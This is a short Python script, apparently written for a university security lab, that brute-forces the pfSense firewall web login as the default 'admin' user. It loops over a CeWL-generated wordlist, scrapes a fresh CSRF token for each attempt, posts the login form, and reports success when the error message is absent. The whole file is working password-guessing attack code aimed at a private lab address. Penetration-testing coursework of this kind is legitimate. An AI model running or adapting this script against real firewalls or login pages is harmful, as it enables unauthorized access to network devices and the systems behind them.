"""
Target:  pfSense login page
Author: Heven Tafese
Email: s4430184@lsbu.ac.uk
"""
import requests
from bs4 import BeautifulSoup
import sys

# Target URL - pfSense login page
target = "http://10.0.2.8/index.php"

# Default admin username for pfSense
username = "admin"

# Custom wordlist generated using CeWL by crawling the pfSense login page
wordlist = "/home/heven84/tools/wordlists/pfsense_cewl.txt"

# Print attack summary so we know its running
print(f"[*] Brute forcing {target} with user '{username}'")

# Open the wordlist and try each password one by one
for password in open(wordlist, encoding='latin-1'):

    # Remove any extra spaces or newline characters
    password = password.strip()

    # Start a new session for each attempt to get a fresh CSRF token
    session = requests.Session()

    # Load the login page and extract the CSRF token from the HTML form
    soup = BeautifulSoup(session.get(target).text, 'html.parser')
    csrf = soup.find('input', {'name': '__csrf_magic'})['value']

    # Submit the login form with the CSRF token and current password
    res = session.post(target, data={
        '__csrf_magic': csrf,
        'usernamefld': username,
        'passwordfld': password,
        'login': 'Login'
    })

    # If the error message is not in the response, login was successful
    if 'Username or Password incorrect' not in res.text:
        print(f"\n[SUCCESS] Password found: {password}")
        sys.exit()

# If we get here, none of the passwords worked
print("[-] Password not found")